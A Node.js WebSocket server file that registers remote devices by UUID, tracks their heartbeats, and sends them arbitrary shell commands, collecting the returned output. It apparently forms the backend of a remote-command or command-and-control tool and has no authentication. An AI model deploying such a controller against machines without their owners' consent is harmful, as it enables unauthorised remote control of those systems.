// server/server.js

import { createServer } from 'http';
import { WebSocketServer } from 'ws';
import { pushOutput } from '../ui/outputBus.js';
import { log, warn, error } from '../utils/logger.js';

import {
  PORT,
  TIMEOUT_CHECK_INTERVAL_MS
} from '../config.js';

import * as db from './database.js';

/* =====================
   BOOTSTRAP
===================== */
export const clients = new Map();
export function startServer() {
  db.initDatabase();

  const server = createServer(httpHandler);

  const wss = new WebSocketServer({ server });

  setupWebSocket(wss);

  setInterval(db.markOfflineByTimeout, TIMEOUT_CHECK_INTERVAL_MS);

  server.listen(PORT, '0.0.0.0', () => {
     log(`Server running on ws://0.0.0.0:${PORT}`);
  });

  return { server, wss };
}

/* =====================
   HTTP
===================== */

function httpHandler(req, res) {
  if (req.url === '/health') {
    res.writeHead(200);
    res.end('OK');
    return;
  }

  res.writeHead(404);
  res.end('Not found');
}

/* =====================
   WEBSOCKET
===================== */

function setupWebSocket(wss) {
  wss.on('connection', (ws, req) => {
    const ip =
      req.socket.remoteAddress?.replace('::ffff:', '') ||
      'unknown';

    let registeredUuid = null;

    log(`[+] Connection from ${ip}`);

    ws.on('message', (data) => {
      handleMessage(ws, data, ip, () => registeredUuid,
        (v) => (registeredUuid = v));
    });

ws.on('close', () => {
  if (registeredUuid) {
    clients.delete(registeredUuid);
    db.markOffline(registeredUuid);
    log(`[-] Offline: ${registeredUuid}`);
  } else {
    log(`[-] Connection closed (never registered) from ${ip}`);
  }
});

    ws.on('error', (err) => {
      error('WS error:', err.message);
    });
  });
}

/* =====================
   MESSAGE HANDLER
===================== */

function handleMessage(ws, data, ip, getUUID, setUUID) {
  try {
    const msg = JSON.parse(data.toString('utf8').trim());

    /* REGISTER */

    if (msg.type === 'register') {
      const uuid = (msg.uuid || '').trim();
      const hostname = (msg.hostname || 'unknown').trim();

      if (!uuid || uuid.length < 8) {
        ws.close(1008, 'Bad UUID');
        return;
      }

      db.registerOrUpdateDevice({ uuid, hostname, ip });

      setUUID(uuid);
clients.set(uuid, ws);


      ws.send(JSON.stringify({
        type: 'registered',
        uuid,
        server_time: Math.floor(Date.now() / 1000)
      }));

       log(`Online: ${uuid} (${hostname})`);

      return;
    }

    /* HEARTBEAT */

    if (msg.type === 'ping' && getUUID()) {
      if (msg.uuid === getUUID()) {
        db.updateHeartbeat({ uuid: getUUID(), ip });
      }
      return;
    }

    /* PAYLOAD */

    if (msg.type === 'message' && getUUID()) {
      handlePayload(msg.payload, getUUID());
    }

  } catch (err) {
     warn('Invalid message:', err.message);
  }
}


export function sendCommand(uuid, command, shell = 'cmd') {
  const ws = clients.get(uuid);

  if (!ws || ws.readyState !== ws.OPEN) {
    return false;
  }

  ws.send(JSON.stringify({
    type: 'run',
    command,
    shell
  }));

  return true;
}


function handlePayload(payload, uuid) {

  if (payload?.type !== 'command_output') return;

  if (!payload.output) return;

  pushOutput(uuid, {
    stdout: payload.output.stdout,
    stderr: payload.output.stderr,
    success: payload.output.success,
    command: payload.command,
    shell: payload.shell,
    timestamp: payload.timestamp
  });
}
